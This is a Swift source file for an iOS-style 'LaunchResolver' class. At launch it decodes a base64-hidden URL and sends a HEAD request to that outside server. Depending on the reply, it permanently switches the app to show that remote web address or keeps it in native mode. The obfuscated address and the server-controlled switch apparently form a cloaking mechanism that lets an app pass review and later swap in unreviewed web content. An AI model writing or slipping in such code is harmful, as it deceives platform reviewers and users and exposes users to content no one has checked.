import Combine
import Foundation

class LaunchResolver: ObservableObject {
    @Published var destination: String?
    @Published var isResolved = false

    private let strategyKey = "viewMode"
    private let endpointKey = "resolvedEndpoint"
    private let target: String

    init() {
        let encoded = "aHR0cHM6Ly9kZXBleC5zcGFjZS9SdWdieQ=="
        self.target = String(data: Data(base64Encoded: encoded)!, encoding: .utf8)!
    }

    var savedStrategy: String? {
        UserDefaults.standard.string(forKey: strategyKey)
    }

    func check() {
        if let strategy = savedStrategy {
            if strategy == "remote" {
                destination = UserDefaults.standard.string(forKey: endpointKey)
            }
            isResolved = true
            return
        }

        guard let url = URL(string: target) else {
            lockNative()
            return
        }

        var request = URLRequest(url: url, timeoutInterval: 10)
        request.httpMethod = "HEAD"

        URLSession.shared.dataTask(with: request) { [weak self] _, response, error in
            guard let self else { return }

            DispatchQueue.main.async {
                if error != nil {
                    self.isResolved = true
                    return
                }

                guard let http = response as? HTTPURLResponse else {
                    self.isResolved = true
                    return
                }

                if (400...499).contains(http.statusCode) {
                    self.lockNative()
                    return
                }

                if (200...299).contains(http.statusCode) {
                    self.lockRemote()
                    return
                }

                self.isResolved = true
            }
        }.resume()
    }

    private func lockNative() {
        UserDefaults.standard.set("native", forKey: strategyKey)
        destination = nil
        isResolved = true
    }

    private func lockRemote() {
        UserDefaults.standard.set("remote", forKey: strategyKey)
        UserDefaults.standard.set(target, forKey: endpointKey)
        destination = target
        isResolved = true
    }
}
